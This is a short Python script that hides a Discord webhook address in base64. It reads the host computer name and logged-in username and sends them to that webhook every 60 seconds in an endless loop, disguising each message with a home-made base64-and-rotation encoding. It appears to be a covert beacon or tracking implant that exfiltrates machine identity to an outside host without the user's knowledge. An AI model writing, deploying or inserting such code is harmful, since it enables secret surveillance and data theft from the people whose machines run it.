import string
import base64
import json
import getpass
import os
import socket
import urllib.request
from time import sleep

# Base64-encoded Discord webhook URL
WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MjM5OTU2OTAzMDU0NTQyOS8xMHVfTGlGVFZfMC02c0JhSGYta1BTS0VqeDFSMlVkUVFWMDVtejJlOUpOSlA0QWVjOE9ZeUw2Y2FaallVYnh4U2N3Qg=="

def format_start_data(computer_name,user_name):
    data = {'info':'script_started','script':'user','computer':computer_name,'username':user_name}
    return f"{json.dumps(data)}"

def format_alive_data(computer_name,user_name):
    data = {'info':'alive','script':'user','computer':computer_name,'username':user_name}
    return f"{json.dumps(data)}"

def encrypt(text: str) -> str:
    # Base64 encode
    b64 = base64.b64encode(text.encode()).decode()

    lower = string.ascii_lowercase
    upper = string.ascii_uppercase

    lower_rot = lower[5:] + lower[:5]      # +5 rotation
    upper_rot = upper[-3:] + upper[:-3]    # -3 rotation

    table = str.maketrans(
        lower + upper,
        lower_rot + upper_rot
    )

    encrypted = b64.translate(table)
    encrypted = encrypted.replace("==","-°").replace("=","_")

    return encrypted
    
def send_webhook(message):
    webhook_url = base64.b64decode(WEBHOOK_B64).decode("utf-8")

    payload = json.dumps({
        "content": encrypt(message)
    }).encode("utf-8")

    req = urllib.request.Request(
        webhook_url,
        data=payload,
        method="POST",
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (DiscordWebhook)"
        }
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            response.read()
        return True
    except urllib.error.HTTPError as e:
        print("HTTP error:", e.code, e.read().decode())
        return False
    except Exception as e:
        print("Error:", e)
        return False

if __name__ == "__main__":
    computer_name = os.environ.get("COMPUTERNAME", socket.gethostname())
    user_name = os.environ.get("USERNAME", "SYSTEM")

    first_message = True
    
    alive_data = format_alive_data(computer_name,user_name)
    while True:
        if first_message:
            msg = (
                f"{format_start_data(computer_name,user_name)}"
            )
        else:        
            msg = (
                f"{alive_data}"
            )
        
        sent = send_webhook(msg)
        if sent and first_message:
            first_message = False

        sleep(60)
